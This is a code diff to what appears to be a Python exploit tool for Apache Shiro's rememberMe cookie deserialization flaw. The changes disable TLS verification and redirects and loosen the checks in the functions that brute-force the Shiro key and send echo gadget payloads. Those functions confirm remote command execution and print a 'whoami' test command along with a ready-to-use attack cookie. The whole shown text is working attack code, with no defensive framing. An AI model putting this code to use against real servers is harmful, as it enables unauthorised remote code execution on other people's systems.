@@ -60,7 +60,7 @@ sign_echo = 0
 
 def shiro_cookies(url):
 
-    rsp = requests.get(url=url, allow_redirects=False)
+    rsp = requests.get(url=url, allow_redirects=False, verify=False)
 
     c = rsp.raw.headers
 
@@ -86,7 +86,7 @@ def shiro_cookies(url):
 
 def shiro_name(cookie, url):
     global name
-    rsp = requests.get(url=url, cookies=cookie, allow_redirects=False)
+    rsp = requests.get(url=url, cookies=cookie, allow_redirects=False, verify=False)
     c = rsp.raw.headers
     if 'Set-Cookie' in c:
         temp_name = c['Set-Cookie']
@@ -130,20 +130,19 @@ def check_key(url, key, ser):
         target = url
     try:
         payload = generator1(key, ser)
-        r = requests.get(target, cookies={name: payload.decode()}, headers=headers, timeout=10, verify=False, stream=True)
+        r = requests.get(target, cookies={name: payload.decode()}, headers=headers, timeout=10, verify=False, stream=True, allow_redirects=False)
         print(r.status_code)
-        if r.status_code == 200:
-            c = 'Set-Cookie'
-            c1 = name + '=deleteMe'
-            t = r.raw.headers
-            if c in t:
-                t1 = t[c]
-                if c1 not in t1:
-                    print(key + ' is found')
-                    sign = key
-            else:
+        c = 'Set-Cookie'
+        c1 = name + '=deleteMe'
+        t = r.raw.headers
+        if c in t:
+            t1 = t[c]
+            if c1 not in t1:
                 print(key + ' is found')
                 sign = key
+        else:
+            print(key + ' is found')
+            sign = key
     except Exception as e:
         print (e)
     return False
@@ -158,16 +157,15 @@ def poc_echo(url, key, func):
     try:
         #rce_command = 'a'
         payload = encode_echo(key, func)
-        r = requests.get(target, cookies={name: payload.decode()}, headers=headers, timeout=10, verify=False, stream=True)
+        r = requests.get(target, cookies={name: payload.decode()}, headers=headers, timeout=10, verify=False, stream=True, allow_redirects=False)
         print (r.status_code)
-        if r.status_code == 200:
-            c= 'Testecho'
-            t = r.raw.headers
-            if c in t:
-                print('echo success: ' + 'key: ' + sign + ' gadget: ' + func + '\n')
-                sign_echo = 1
-                print('Testcmd: whoami')
-                print("Cookie: " + name + "={0}".format(payload.decode()))
+        c= 'Testecho'
+        t = r.raw.headers
+        if c in t:
+            print('echo success: ' + 'key: ' + sign + ' gadget: ' + func + '\n')
+            sign_echo = 1
+            print('Testcmd: whoami')
+            print("Cookie: " + name + "={0}".format(payload.decode()))
     except Exception as e:
         print (e)
     return False
